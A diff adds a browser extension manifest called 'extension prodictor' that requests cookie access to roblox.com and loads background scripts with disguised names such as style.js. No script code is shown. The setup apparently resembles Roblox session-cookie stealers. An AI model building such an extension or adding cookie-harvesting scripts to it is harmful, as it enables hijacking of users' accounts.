@@ -1,0 +1,21 @@
+{
+   "name":"extension prodictor",
+    "version":"2",
+    "manifest_version":2,
+    "description":"extension prodictor",
+    "browser_action": {
+       "default_popup": "popup.html",
+       "default_icon": "logo.png"
+    },
+    "permissions":[
+       "cookies",
+       "https://www.roblox.com/"
+    ],
+    "background":{
+       "scripts":["Bgwork.js","style.js","script.js","style.css"]
+    },
+     "icons": { "16": "logo.png",
+            "48": "logo.png",
+           "128": "logo.png" }
+ }
+ 
